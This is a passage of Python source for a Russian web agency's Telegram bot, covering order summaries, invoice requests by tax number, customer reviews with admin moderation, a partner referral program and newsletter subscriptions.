    for c in cart:
        if c in SERVICE:
            lines.append(f"| + опция | {SERVICE[c]['name']} |")
    lines.append(f"| **Итого при запуске** | **{fmt_amount(total)}** |")
    lines.append("| Разработка | **0 ₽** |")
    lines += ["", "> Платите только когда сайт готов и вам нравится.", "",
              "### 👤 Ваш бизнес",
              f"- {q.get('company_name') or p.get('name', '-')}",
              f"- {q.get('niche', '-')} · {q.get('city', '-')}",
              f"- Цель сайта: {q.get('main_action', '-')}"]
    if q.get("has_domain") == "Да, есть" and q.get("domain_name"):
        lines.append(f"- Домен: `{q.get('domain_name')}`")
    elif q.get("has_domain"):
        lines.append("- Домен: подберём вместе")
    miss = _get(f"onyx:miss:{uid}") or ""
    soft = [m for m in miss.split(", ") if m and "(желательно)" not in m][:5]
    if soft:
        lines += ["", "### 📎 Пригодится от вас", "\n".join(f"- {m}" for m in soft),
                  "", "> Не обязательно сейчас - можно прислать позже. Материалы хранятся "
                  "в защищённой папке вашего проекта и используются только для вашего сайта."]
    lines += ["", "Дальше - реквизиты для счёта. "
              "*Счёт выставим только после того, как утвердите сайт.*"]
    return "\n".join(lines)


def order_can_pay(o, uid):
    """Условия оплаты: заказ существует, принадлежит клиенту, ждёт оплаты, анкета есть."""
    if not o or o.get("uid") != uid:
        return False, "Заказ не найден."
    if not anketa_done(uid):
        return False, "Сначала заполните анкету."
    if not o.get("items"):
        return False, "Заказ пуст."
    if o.get("payment_status") != "pending":
        return False, "Этот заказ уже в обработке."
    return True, ""


def order_pay_method(chat_id, uid, oid, method):
    o = order_get(int(oid)) if str(oid).isdigit() else None
    ok, err = order_can_pay(o, uid)
    if not ok:
        send(chat_id, err, MAIN_MENU)
        return
    kind = "legal" if method == "legal" else "individual"
    start_cap(chat_id, uid, kind, order_id=o["id"])


def invoice_inn_input(chat_id, user, uid, st, text):
    inn = re.sub(r"\D", "", text or "")
    if len(inn) not in (10, 12):
        send(chat_id, "ИНН должен состоять из 10 или 12 цифр. Попробуйте ещё раз 👇")
        return
    o = order_get(st.get("order_id"))
    if not o or o.get("uid") != uid:
        state_del(uid)
        send(chat_id, "Заказ не найден.", MAIN_MENU)
        return
    o["inn"] = inn
    o["payment_method"] = "invoice"
    o["payment_status"] = "invoice_requested"
    o["status"] = "waiting_invoice"
    o["updated"] = now_str()
    order_save(o)
    sheet_order(o)
    state_del(uid)
    log_event(uid, "invoice_requested", str(o.get("id")))
    lead_touch(uid, username=user.get("username"), status="invoice_requested", action="invoice_requested")
    create_task("order", o.get("id"), f"Выставить счёт (заказ №{o.get('id')}, ИНН {inn})",
                telegram_id=uid, order_id=o.get("id"), priority="high", notify=False)
    recompute_tags(uid)
    send(chat_id, "Спасибо. Мы получили ИНН и подготовим счёт на оплату. "
                  "После выставления счёта с вами свяжется команда ONYX.", MAIN_MENU)
    uname = f"@{user.get('username')}" if user.get("username") else "-"
    names = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", []))
    cm = o.get("service_comments") or {}
    cm_txt = " | ".join(f"{SERVICE.get(c, {}).get('name', c)}: {t}" for c, t in cm.items()) or "-"
    notify_admins("🧾 <b>Новый запрос счёта от юрлица</b>\n"
                  f"Клиент: id {uid}\n"
                  f"Telegram: {uname}\n"
                  f"ИНН: {inn}\n"
                  f"Сумма: {fmt_amount(o.get('total', 0))}\n"
                  f"Услуги: {names}\n"
                  f"Комментарии: {cm_txt}\n"
                  f"Заказ: №{o['id']}")


# ------------------------- Прочие экраны -------------------------
def send_checklist(chat_id, with_brief_button=True):
    kb = checklist_kb(with_brief_button)
    if CHECKLIST_URL:
        send_rich(chat_id, CHECKLIST_PITCH, reply_markup=kb)
    elif CHECKLIST_PDF_URL:
        tg("sendDocument", chat_id=chat_id, document=CHECKLIST_PDF_URL,
           caption="📋 Чек-лист перед запуском сайта - 14 пунктов подготовки "
                   "и 6 условий, о которых стоит договориться с подрядчиком.",
           reply_markup=kb)
    else:
        send(chat_id, "📋 Чек-лист скоро будет доступен.", kb)


def checklist_delivered(uid):
    """CHK-01: зафиксировать выдачу чек-листа - событие, стадия, журнал."""
    try:
        log_event(uid, "checklist_received")
        cid = client_id_of(uid)
        journal_add(cid, "checklist_received")
        c = client_get(cid)
        if c and c.get("current_stage") in (None, "", "new"):
            client_set_stage(cid, "checklist_received")
        lead_touch(uid, action="checklist_received")
    except Exception as e:
        print("checklist_delivered err", e)


CHECKLIST_PITCH = (
    "# 📋 Чек-лист перед запуском сайта\n\n"
    "Забирайте - пригодится, даже если работать будете не с нами.\n\n"
    "| | |\n|---|---|\n"
    "| 14 пунктов | что собрать до старта |\n"
    "| 6 условий | о чём договориться с подрядчиком |\n"
    "| Проверка | 6 вопросов по действующему сайту |\n\n"
    "> Открывается в браузере, отметки сохраняются. Можно распечатать "
    "или сохранить в PDF."
)


def checklist_kb(with_brief=True):
    rows = []
    if CHECKLIST_URL:
        rows.append([{"text": "📖 Открыть чек-лист", "url": CHECKLIST_URL}])
    if with_brief:
        rows.append([{"text": "🚀 Сделать сайт", "callback_data": "brief:start"}])
    return {"inline_keyboard": rows} if rows else None


def start_flow(chat_id, uid=None):
    """Вход в воронку. Не продаём тариф и не открываем анкету - сначала
    выясняем, есть ли сайт, и ведём к стратегической консультации.

    Первый экран был перегружен: два сообщения подряд и двенадцать вариантов
    выбора. Человек, впервые открывший бота, не понимает, куда смотреть -
    на нижнее меню или на кнопки в сообщении. Поэтому нижнее меню показываем
    одной короткой строкой, а весь фокус отдаём развилке из трёх вариантов."""
    send(chat_id, "👋 <b>ONYX WEB</b> · сайты для бизнеса", MAIN_MENU)
    send_rich(chat_id, ENTRY_MD, reply_markup=entry_kb())
    if uid:
        try:
            if not crm_get(uid):
                crm_set(uid, "new_lead", notify=False)
            crm_set(uid, "first_contact", notify=False)
        except Exception as e:
            print("start crm err", e)


def rating_kb():
    """5 звёзд (ТЗ п.2, шаг 1)."""
    return {"inline_keyboard": [[{"text": "⭐" * n, "callback_data": f"rev:rate:{n}"}] for n in range(1, 6)]}


# ------------------------- Этап 8: Отзывы -------------------------
REVIEW_ASK = ("🎉 <b>Поздравляем! Ваш сайт успешно запущен.</b>\n\n"
              "Спасибо, что выбрали ONYX.\n\n"
              "Нам будет очень приятно, если вы уделите одну минуту и оставите отзыв о нашей работе.")

REVIEW_VIDEO_ASK = ("📹 Хотите записать видеоотзыв? Это может быть короткий кружок Telegram - "
                    "необязательно, но нам будет очень приятно.")

REVIEW_THANKS = "Спасибо за ваш отзыв! Он отправлен на публикацию - команда ONYX его проверит."


def next_review_id():
    if KV_URL:
        return int(_redis("INCR", "onyx:review_seq") or 1)
    _MEM["_review_seq"] = _MEM.get("_review_seq", 0) + 1
    return _MEM["_review_seq"]


def review_get(rid):
    return _get(f"onyx:review:{rid}")


def review_save(r, to_sheet=True):
    r["updated_at"] = now_str()
    _set(f"onyx:review:{r['review_id']}", r, ttl=YEAR)
    if to_sheet:
        sheet_review(r)
    return r


def review_new(uid, username, order_id):
    rid = next_review_id()
    r = {"review_id": rid, "telegram_id": uid, "username": username or "",
         "order_id": order_id or "", "rating": "", "text_review": "",
         "video_file_id": "", "status": "started", "permission_to_publish": "",
         "created_at": now_str(), "updated_at": now_str()}
    if KV_URL:
        _redis("RPUSH", "onyx:reviews_all", str(rid))
    else:
        _MEM.setdefault("_reviews_all", []).append(rid)
    # привяжем отзыв к заказу, чтобы не спрашивать повторно
    if order_id:
        o = order_get(order_id)
        if o:
            o["review_id"] = rid
            order_save(o)
    return review_save(r, to_sheet=False)


def all_review_ids():
    if KV_URL:
        r = _redis("LRANGE", "onyx:reviews_all", "-500", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return _MEM.get("_reviews_all", [])


def sheet_review(r):
    perm = r.get("permission_to_publish")
    sheet_post("Reviews", {
        "review_id": r.get("review_id", ""), "telegram_id": r.get("telegram_id", ""),
        "username": r.get("username", ""), "order_id": r.get("order_id", ""),
        "rating": r.get("rating", ""), "text_review": r.get("text_review", ""),
        "video_file_id": r.get("video_file_id", ""), "status": r.get("status", ""),
        "permission_to_publish": ("true" if perm is True else "false" if perm is False else ""),
        "site_url": r.get("site_url", ""), "company_name": r.get("company_name", ""),
        "created_at": r.get("created_at", ""), "updated_at": r.get("updated_at", ""),
    })


def last_completed_order(uid):
    p = user_get(uid) or {}
    for oid in reversed(p.get("orders", [])):
        o = order_get(oid)
        if o and proj_status(o) == "completed":
            return o
    return None


def review_start(chat_id, uid, username="", order_id=None, intro=True):
    """ТЗ п.1-2. intro=True - приглашение с кнопкой «Оставить отзыв» (после completed).
    intro=False - сразу к оценке (ручной вызов из личного кабинета)."""
    if intro:
        send(chat_id, REVIEW_ASK,
             {"inline_keyboard": [[{"text": "⭐ Оставить отзыв", "callback_data": f"rev:begin:{order_id or 0}"}]]})
        return None
    r = review_new(uid, username, order_id)
    state_set(uid, {"flow": "review", "step": "rate", "rid": r["review_id"]})
    send(chat_id, "Поставьте оценку нашей работе:", rating_kb())
    return r


def review_ask_text(chat_id, uid, rid):
    state_set(uid, {"flow": "review", "step": "ask_text", "rid": rid})
    send(chat_id, "Что вам понравилось в работе с ONYX? Напишите пару слов - или пропустите этот шаг.",
         {"inline_keyboard": [
             [{"text": "✍️ Написать отзыв", "callback_data": "rev:text"}],
             [{"text": "Пропустить", "callback_data": "rev:skip_text"}],
         ]})


def review_ask_video(chat_id, uid, rid):
    state_set(uid, {"flow": "review", "step": "ask_video", "rid": rid})
    send(chat_id, REVIEW_VIDEO_ASK,
         {"inline_keyboard": [
             [{"text": "✅ Записать кружок", "callback_data": "rev:video"}],
             [{"text": "⏭ Пропустить", "callback_data": "rev:skip_video"}],
         ]})


def review_preview_text(r, uid):
    p = user_get(uid) or {}
    d = _get(f"onyx:quest:{uid}") or {}
    site = p.get("website") or "-"
    lines = ["👀 <b>Предпросмотр отзыва</b>", "",
             f"⭐ Оценка: {'⭐' * int(r.get('rating') or 0)} ({r.get('rating') or '-'}/5)",
             f"Текст: {r.get('text_review') or '-'}",
             f"Видео: {'приложено 📹' if r.get('video_file_id') else 'нет'}",
             f"Сайт: {site}"]
    if d.get("company_name"):
        r["company_name"] = d["company_name"]
    if site and site != "-":
        r["site_url"] = site
    return "\n".join(lines)


def review_preview(chat_id, uid, rid):
    """ТЗ п.2, шаг 4: предпросмотр перед публикацией."""
    r = review_get(rid)
    if not r:
        state_del(uid)
        return
    state_set(uid, {"flow": "review", "step": "preview", "rid": rid})
    txt = review_preview_text(r, uid)
    review_save(r, to_sheet=False)
    send(chat_id, txt, {"inline_keyboard": [
        [{"text": "✅ Опубликовать", "callback_data": "rev:publish"}],
        [{"text": "✏️ Изменить", "callback_data": "rev:redo"}],
        [{"text": "❌ Отмена", "callback_data": "rev:cancel"}],
    ]})


def review_submit(chat_id, uid, rid):
    """Клиент нажал «Опубликовать» - отправляем на модерацию администраторам (ТЗ п.3)."""
    r = review_get(rid)
    if not r:
        state_del(uid)
        return
    r["status"] = "pending_review"
    r["permission_to_publish"] = True
    review_save(r)
    log_event(uid, "review_left", str(r.get("rating", "")))
    state_del(uid)
    send(chat_id, REVIEW_THANKS, MAIN_MENU)
    notify_review_admins(r)
    # низкая оценка - отдельно спросим, что улучшить
    try:
        if int(r.get("rating") or 0) <= 3:
            create_task("support", uid, f"Разобрать обратную связь (оценка {r.get('rating')}/5)",
                        description=r.get("text_review", ""), telegram_id=uid, priority="high", notify=False)
            state_set(uid, {"flow": "review_improve", "rid": rid})
            send(chat_id, "Нам важно стать лучше. Что нам стоит улучшить?",
                 {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True})
    except Exception:
        pass


def review_cancel(chat_id, uid, rid):
    r = review_get(rid)
    if r:
        r["status"] = "cancelled"; review_save(r, to_sheet=False)
    state_del(uid)
    send(chat_id, "Хорошо, отзыв отменён. Спасибо, что были с нами! 🤝", MAIN_MENU)


REVIEW_STATUS_RU = {
    "started": "🕐 Начат", "pending_review": "🕐 На модерации",
    "approved": "✅ Опубликован", "rejected": "❌ Отклонён", "cancelled": "🚫 Отменён",
}


def notify_review_admins(r):
    p = user_get(r.get("telegram_id")) or {}
    d = _get(f"onyx:quest:{r.get('telegram_id')}") or {}
    uname = f"@{r['username']}" if r.get("username") else "-"
    company = d.get("company_name") or p.get("name") or "-"
    site = r.get("site_url") or p.get("website") or "-"
    rid = r["review_id"]
    notify_admins(
        "⭐ <b>Новый отзыв ONYX - нужна модерация</b>\n"
        f"Имя клиента: {p.get('name', '-')}\n"
        f"Компания: {company}\n"
        f"Telegram: {uname} (id {r.get('telegram_id')})\n"
        f"Дата: {r.get('created_at', '-')}\n"
        f"Оценка: {'⭐' * int(r.get('rating') or 0)} ({r.get('rating') or '-'}/5)\n"
        f"Текст: {r.get('text_review') or '-'}\n"
        f"Видео: {'есть' if r.get('video_file_id') else 'нет'}\n"
        f"Сайт клиента: {site}\n"
        f"ID заказа: {r.get('order_id') or '-'}\n"
        f"Статус: {REVIEW_STATUS_RU.get(r.get('status'), r.get('status'))}\n"
        f"review_id: {rid}",
        kb={"inline_keyboard": [[
            {"text": "✅ Одобрить", "callback_data": f"rev:adm:approve:{rid}"},
            {"text": "❌ Отклонить", "callback_data": f"rev:adm:reject:{rid}"},
            {"text": "✏ Изменить", "callback_data": f"rev:adm:edit:{rid}"},
        ]]})
    if r.get("video_file_id"):
        for aid in ADMIN_IDS:
            try:
                tg("sendVideoNote", chat_id=aid, video_note=r["video_file_id"])
            except Exception as e:
                print("send video_note err", e)


def open_review_section(chat_id, uid, username=""):
    """Меню «Оценить сервис»."""
    o = last_completed_order(uid)
    if not o:
        send(chat_id, "Оценить сервис можно после завершения проекта.", MAIN_MENU)
        return
    rid = o.get("review_id")
    r = review_get(rid) if rid else None
    if r and r.get("status") in ("pending_review", "approved"):
        send(chat_id, "Спасибо, вы уже оставили отзыв по последнему завершённому проекту.", MAIN_MENU)
        return
    review_start(chat_id, uid, username, order_id=o["id"], intro=False)


def public_reviews_list(limit=10):
    """ТЗ п.4: раздел «Отзывы ONYX» - только одобренные отзывы, новые сверху."""
    out = []
    for rid in reversed(all_review_ids()):
        r = review_get(rid)
        if r and r.get("status") == "approved":
            out.append(r)
        if len(out) >= limit:
            break
    return out


def send_reviews_section(chat_id, uid):
    reviews = public_reviews_list()
    if not reviews:
        send(chat_id, "⭐ <b>Отзывы наших клиентов</b>\n\n"
                      "Отзывы клиентов появятся здесь после первых сданных проектов.\n"
                      "Пока можно посмотреть примеры работ - они живые, их можно открыть и потыкать.", MAIN_MENU)
        return
    send(chat_id, f"⭐ <b>Отзывы наших клиентов</b>\nПоказаны последние {len(reviews)}:")
    for r in reviews:
        stars = "⭐" * int(r.get("rating") or 0)
        company = r.get("company_name") or "-"
        date = (r.get("created_at") or "")[:10]
        lines = [f"{stars} · <b>{company}</b>", r.get("text_review") or "", f"📅 {date}"]
        site = r.get("site_url")
        kb = {"inline_keyboard": [[{"text": "🌐 Посмотреть сайт", "url": site}]]} if site else None
        send(chat_id, "\n".join(x for x in lines if x), kb)
        if r.get("video_file_id"):
            try:
                tg("sendVideoNote", chat_id=chat_id, video_note=r["video_file_id"])
            except Exception as e:
                print("send review video err", e)
    send(chat_id, "Хотите такой же результат? 👇",
         {"inline_keyboard": [[{"text": "🌐 Заказать сайт", "callback_data": "brief:start"}]]})


# ------------------------- Этап 9: Партнёрская программа -------------------------
PARTNER_TEXT = (
    "🤝 <b>Станьте партнёром ONYX</b>\n\n"
    "Рекомендуйте наши услуги своим клиентам и получайте вознаграждение за каждый "
    "реализованный проект.\n\n"
    "Если ваши клиенты нуждаются в сайте, интернет-магазине, CRM, онлайн-записи или "
    "цифровых решениях для бизнеса - мы берём разработку на себя, а вы получаете "
    "партнёрское вознаграждение.\n\n"
    "<b>Преимущества партнёрства:</b>\n"
    "- дополнительный источник дохода;\n"
    "- вознаграждение за каждого клиента;\n"
    "- прозрачные условия;\n"
    "- сопровождение проекта нашей командой;\n"
    "- возможность долгосрочного сотрудничества.\n\n"
    "<b>Кому подходит:</b> SMM-специалистам, маркетологам, таргетологам, SEO-специалистам, "
    "дизайнерам, видеографам, контент-мейкерам, типографиям, бизнес-консультантам "
    "и агентствам, которые работают с предпринимателями."
)

PARTNER_HOW = (
    "ℹ️ <b>Как это работает</b>\n\n"
    "1️⃣ Вы рекомендуете ONYX клиенту.\n"
    "2️⃣ Клиент оставляет заявку или связывается с нами.\n"
    "3️⃣ Мы фиксируем, от какого партнёра пришёл клиент.\n"
    "4️⃣ Клиент оплачивает проект.\n"
    "5️⃣ Вы получаете партнёрское вознаграждение.\n\n"
    "Мы фиксируем каждого клиента, который пришёл по вашей рекомендации. "
    "Выплата партнёрского вознаграждения происходит после оплаты проекта клиентом."
)

PARTNER_STATUS_RU = {
    "new_application": "🆕 Заявка на рассмотрении",
    "approved": "✅ Одобрена",
    "rejected": "❌ Отклонена",
    "active": "🚀 Активный партнёр",
    "paused": "⏸ На паузе",
}

PARTNER_STEPS = [
    ("name", "Как вас зовут?"),
    ("activity", "Чем вы занимаетесь? (например: SMM, таргет, дизайн, агентство)"),
    ("contact", "Ваш Telegram для связи (например: @username)"),
    ("has_clients", "Есть ли у вас клиенты, которым могут быть нужны сайты?"),
    ("portfolio_link", "Ссылка на сайт / соцсети / портфолио:"),
    ("comment", "Комментарий (если нечего добавить - напишите «нет»):"),
]

HAS_CLIENTS_OPTS = ["Да, уже есть", "Скорее да", "Пока нет"]


def next_partner_id():
    if KV_URL:
        return int(_redis("INCR", "onyx:partner_seq") or 1)
    _MEM["_partner_seq"] = _MEM.get("_partner_seq", 0) + 1
    return _MEM["_partner_seq"]


def partner_get(uid):
    return _get(f"onyx:partner:{uid}")


def partner_save(p, to_sheet=True):
    p["updated_at"] = now_str()
    _set(f"onyx:partner:{p['telegram_id']}", p, ttl=YEAR)
    if to_sheet:
        sheet_partner(p)
    return p


def make_partner_code(pid, username=""):
    """P001 / P002… либо ONYX_USERNAME, если есть username."""
    if username:
        clean = re.sub(r"[^A-Za-z0-9]", "", username).upper()[:12]
        if clean:
            return f"ONYX_{clean}"
    return f"P{int(pid):03d}"


def partner_new(uid, username, data):
    pid = next_partner_id()
    p = {"partner_id": pid, "telegram_id": uid, "username": username or "",
         "name": data.get("name", ""), "activity": data.get("activity", ""),
         "contact": data.get("contact", ""), "has_clients": data.get("has_clients", ""),
         "portfolio_link": data.get("portfolio_link", ""), "comment": data.get("comment", ""),
         "partner_status": "new_application", "partner_code": make_partner_code(pid, username),
         "referred_clients_count": 0, "total_reward": 0, "payout_status": "none",
         "created_at": now_str(), "updated_at": now_str()}
    if KV_URL:
        _redis("RPUSH", "onyx:partners_all", str(uid))
    else:
        _MEM.setdefault("_partners_all", []).append(uid)
    return partner_save(p)


def partners_all():
    if KV_URL:
        r = _redis("LRANGE", "onyx:partners_all", "0", "-1") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_partners_all", []))


def sheet_partner(p):
    sheet_post("Partners", {
        "partner_id": p.get("partner_id", ""), "telegram_id": p.get("telegram_id", ""),
        "username": p.get("username", ""), "name": p.get("name", ""),
        "activity": p.get("activity", ""), "contact": p.get("contact", ""),
        "has_clients": p.get("has_clients", ""), "portfolio_link": p.get("portfolio_link", ""),
        "comment": p.get("comment", ""), "partner_status": p.get("partner_status", ""),
        "partner_code": p.get("partner_code", ""),
        "referred_clients_count": p.get("referred_clients_count", 0),
        "total_reward": p.get("total_reward", 0), "payout_status": p.get("payout_status", ""),
        "created_at": p.get("created_at", ""), "updated_at": p.get("updated_at", ""),
    })


def partner_menu_kb():
    return {"inline_keyboard": [
        [{"text": "✍️ Оставить заявку партнёра", "callback_data": "pt:apply"}],
        [{"text": "ℹ️ Как это работает", "callback_data": "pt:how"}],
        [{"text": "🏠 Назад в меню", "callback_data": "b:home"}],
    ]}


def render_partner_status(p):
    st = PARTNER_STATUS_RU.get(p.get("partner_status"), p.get("partner_status", ""))
    lines = ["🤝 <b>Ваша заявка партнёра</b>", "",
             f"Статус: {st}",
             f"Партнёрский код: <code>{p.get('partner_code', '-')}</code>",
             f"Подана: {p.get('created_at', '-')}"]
    if p.get("partner_status") in ("approved", "active"):
        lines.append(f"\nПриведено клиентов: {p.get('referred_clients_count', 0)}")
        lines.append(f"Начислено вознаграждения: {fmt_amount(p.get('total_reward', 0))}")
    lines.append("\nПо вопросам партнёрства: @" + MANAGER_USERNAME)
    return "\n".join(lines)


def open_partner_section(chat_id, uid):
    p = partner_get(uid)
    if p:
        send(chat_id, render_partner_status(p),
             {"inline_keyboard": [[{"text": "ℹ️ Как это работает", "callback_data": "pt:how"}],
                                  [{"text": "🏠 Назад в меню", "callback_data": "b:home"}]]})
        return
    send(chat_id, PARTNER_TEXT, partner_menu_kb())


def send_partner_step(chat_id, st):
    i = st["i"]
    key, q = PARTNER_STEPS[i]
    kb = {"keyboard": [[{"text": "🏠 Главное меню"}]], "resize_keyboard": True}
    if key == "has_clients":
        kb = {"inline_keyboard": [[{"text": o, "callback_data": f"pt:hc:{n}"}]
                                  for n, o in enumerate(HAS_CLIENTS_OPTS)]}
    send(chat_id, f"<b>Вопрос {i + 1} из {len(PARTNER_STEPS)}</b>\n{q}", kb)


def partner_step_next(chat_id, user, st, value):
    key = PARTNER_STEPS[st["i"]][0]
    st["data"][key] = value
    st["i"] += 1
    uid = user.get("id")
    if st["i"] < len(PARTNER_STEPS):
        state_set(uid, st)
        send_partner_step(chat_id, st)
        return
    # финал
    state_del(uid)
    data = st["data"]
    p = partner_new(uid, user.get("username", ""), data)
    log_event(uid, "partner_apply")
    add_tag(uid, "partner_candidate")
    create_task("partner", uid, f"Связаться с партнёром {p.get('partner_code', '')}",
                telegram_id=uid, priority="normal", notify=False)
    send(chat_id, "Спасибо! Мы получили вашу заявку на партнёрство. "
                  "Команда ONYX свяжется с вами и расскажет подробности.\n\n"
                  f"Ваш партнёрский код: <code>{p['partner_code']}</code>", MAIN_MENU)
    uname = f"@{user.get('username')}" if user.get("username") else "-"
    notify_admins("🤝 <b>Новая заявка партнёра ONYX:</b>\n"
                  f"Имя: {data.get('name', '-')}\n"
                  f"Telegram: {uname} (id {uid})\n"
                  f"Чем занимается: {data.get('activity', '-')}\n"
                  f"Есть ли клиенты: {data.get('has_clients', '-')}\n"
                  f"Ссылка: {data.get('portfolio_link', '-')}\n"
                  f"Комментарий: {data.get('comment', '-')}\n"
                  f"Контакт: {data.get('contact', '-')}\n"
                  f"Код: {p['partner_code']}")


# ------------------------- Этап 10: Информативный ONYX + рассылки -------------------------
# Темы писем. Половина из них - про сайты, но подписываются на них редко:
# предпринимателю интереснее «где брать клиентов», а не «как устроен сайт».
# Поэтому добавили темы про деньги, продажи и найм - они и приводят читателя,
# а сайт мы упоминаем внутри, между делом.
TOPICS = {
    "leads":    "🎯 Где брать клиентов",
    "sales":    "💰 Продажи и переговоры",
    "money":    "📊 Деньги в бизнесе",
    "ai":       "🤖 AI в работе",
    "sites":    "📈 Сайты и заявки",
    "ads":      "📣 Реклама без слива бюджета",
    "crm":      "⚙️ Автоматизация рутины",
    "team":     "👥 Люди и найм",
    "cases":    "💼 Разборы бизнесов",
    "mistakes": "⚠️ Ошибки, которые дорого стоят",
    "law":      "📋 Налоги и документы",
    "shop":     "🛍 Онлайн-продажи и оплата",
}
# Полные названия тем (для текстов и AI-черновиков)
TOPIC_FULL = {
    "leads":    "Каналы привлечения клиентов: что работает в малом бизнесе сейчас, "
                "сколько стоит заявка, откуда идут дешёвые обращения",
    "sales":    "Продажи и переговоры: как доводить заявку до сделки, что отвечать "
                "на «дорого», как не терять клиента после первого разговора",
    "money":    "Деньги в бизнесе: считать прибыль, а не оборот; себестоимость услуги, "
                "кассовые разрывы, на чём предприниматели теряют больше всего",
    "ai":       "AI в ежедневной работе предпринимателя: тексты, ответы клиентам, "
                "разбор конкурентов, что реально экономит время, а что игрушка",
    "sites":    "Сайты и заявки: как сайт влияет на продажи, что заставляет человека "
                "написать, а что закрывает вкладку",
    "ads":      "Реклама без слива бюджета: куда уходят деньги, как считать окупаемость, "
                "минимальный бюджет для теста",
    "crm":      "Автоматизация рутины: CRM, напоминания, отчёты, шаблоны - что можно "
                "не делать руками уже завтра",
    "team":     "Люди и найм: где искать сотрудников в малый бизнес, как проверять "
                "на входе, как не остаться единственным работающим человеком",
    "cases":    "Разборы бизнесов: что сделали, что получилось, что не сработало, "
                "с цифрами и без приукрашивания",
    "mistakes": "Ошибки, которые дорого стоят: типовые провалы в упаковке, рекламе, "
                "договорах и сайтах - и как их заметить заранее",
    "law":      "Налоги и документы: режимы, самозанятость, договоры с клиентами, "
                "что подписывать и чего избегать",
    "shop":     "Онлайн-продажи и оплата: приём платежей, доставка, витрина, "
                "что нужно по закону",
}

CONTENT_INTRO = ("📬 <b>Полезные письма</b>\n\n"
                 "Короткие разборы для владельца бизнеса: как получать больше клиентов, "
                 "считать деньги и не тратить время на рутину. Без воды и без "
                 "«успешного успеха».\n\n"
                 "<b>Не чаще раза в неделю.</b> Отписаться можно в одно нажатие.\n\n"
                 "Отметьте темы, которые вам интересны 👇")


def csub_get(uid):
    return _get(f"onyx:csub:{uid}")


def csub_save(s, to_sheet=True):
    s["updated_at"] = now_str()
    _set(f"onyx:csub:{s['telegram_id']}", s, ttl=YEAR)
    if to_sheet:
        sheet_csub(s)
    return s


def csub_ensure(uid):
    s = csub_get(uid)
    if not s:
        s = {"subscription_id": uid, "telegram_id": uid, "topics": [],
             "status": "inactive", "last_sent_at": "",
             "created_at": now_str(), "updated_at": now_str()}
        if KV_URL:
            _redis("SADD", "onyx:csubs_all", str(uid))
        else:
            _MEM.setdefault("_csubs_all", set()).add(uid)
        csub_save(s, to_sheet=False)
    return s


def csubs_all():
    if KV_URL:
        r = _redis("SMEMBERS", "onyx:csubs_all") or []
        return [int(x) for x in r if str(x).isdigit()]
    return list(_MEM.get("_csubs_all", set()))


def sheet_csub(s):
    sheet_post("ContentSubscriptions", {
        "subscription_id": s.get("subscription_id", ""),
        "telegram_id": s.get("telegram_id", ""),
        "topics": ", ".join(s.get("topics", [])),
        "status": s.get("status", ""),
        "last_sent_at": s.get("last_sent_at", ""),
        "created_at": s.get("created_at", ""),
        "updated_at": s.get("updated_at", ""),
    })


def csub_toggle(uid, topic):
    s = csub_ensure(uid)
    topics = list(s.get("topics") or [])
    if topic in topics:
        topics.remove(topic)
    else:
        topics.append(topic)
    s["topics"] = topics
    s["status"] = "active" if topics else "inactive"
    return csub_save(s)


def csub_all_topics(uid):
    s = csub_ensure(uid)
    s["topics"] = list(TOPICS.keys())
    s["status"] = "active"
    return csub_save(s)


def csub_unsubscribe(uid):
    s = csub_ensure(uid)
    s["topics"] = []
    s["status"] = "inactive"
    return csub_save(s)


def content_kb(uid):
    """Темы в два столбца плюс подтверждение выбора.

    Раньше двенадцать тем шли одна под другой на весь экран, а закончив
    отмечать, человек упирался в «Назад» - непонятно, сохранилось ли что-то.
    Теперь есть явное «Готово», которое подтверждает подписку и ведёт дальше."""
    st = csub_ensure(uid)
    chosen = set(st.get("topics") or [])
    rows, pair = [], []
    for key, label in TOPICS.items():
        mark = "✅" if key in chosen else "◻️"
        pair.append({"text": f"{mark} {label}", "callback_data": f"ct:t:{key}"})
        if len(pair) == 2:
            rows.append(pair); pair = []
    if pair:
        rows.append(pair)
    rows.append([{"text": "📚 Отметить всё", "callback_data": "ct:all"}])
    if chosen:
        rows.append([{"text": f"➡️ Готово ({len(chosen)}) - подписаться",
                      "callback_data": "ct:done"}])
    else:
        rows.append([{"text": "⏭ Пропустить", "callback_data": "ct:skip"}])
    rows.append([{"text": "🔕 Отписаться от всего", "callback_data": "ct:off"}])
    rows.append([{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}])
    rows.append(nav_row(uid, back="b:cab"))
    return {"inline_keyboard": rows}


def content_text(uid):
    st = csub_ensure(uid)
    topics = [t for t in (st.get("topics") or []) if t in TOPICS]
    if not topics:
        return CONTENT_INTRO + "\n\n<i>Пока ничего не выбрано.</i>"
    names = ", ".join(TOPICS[t].split(" ", 1)[1] for t in topics)
    return CONTENT_INTRO + f"\n\n<b>Выбрано ({len(topics)}):</b> {names}"


def topic_subscribers(topic):
    """Клиенты, подписанные на тему (отписавшиеся исключены)."""
    out = []
    for uid in csubs_all():
        s = csub_get(uid)
        if not s or s.get("status") != "active":
            continue
        if topic in (s.get("topics") or []):
            out.append(uid)
    return out


# ---- Рассылки ----
def next_broadcast_id():
    if KV_URL:
        return int(_redis("INCR", "onyx:broadcast_seq") or 1)
    _MEM["_bc_seq"] = _MEM.get("_bc_seq", 0) + 1
    return _MEM["_bc_seq"]


def bc_get(bid):
    return _get(f"onyx:broadcast:{bid}")


def bc_save(b, to_sheet=True):
    _set(f"onyx:broadcast:{b['broadcast_id']}", b, ttl=YEAR)
    if to_sheet:
        sheet_broadcast(b)
    return b


def sheet_broadcast(b):
    sheet_post("BroadcastLogs", {
        "broadcast_id": b.get("broadcast_id", ""), "topic": b.get("topic", ""),
        "text": (b.get("text") or "")[:2000], "sent_count": b.get("sent_count", 0),
        "failed_count": b.get("failed_count", 0), "created_by": b.get("created_by", ""),
        "created_at": b.get("created_at", ""), "status": b.get("status", ""),
    })


def bc_create(topic, text, created_by):
    bid = next_broadcast_id()
    queue = topic_subscribers(topic)
    b = {"broadcast_id": bid, "topic": topic, "text": text, "sent_count": 0,
         "failed_count": 0, "created_by": created_by, "created_at": now_str(),
         "status": "queued", "queue": queue}
    return bc_save(b, to_sheet=False)


def bc_pending_add(bid):
    if KV_URL:
        _redis("RPUSH", "onyx:broadcasts_pending", str(bid))
    else:
        _MEM.setdefault("_bc_pending", []).append(bid)


def bc_pending_all():
    if KV_URL:
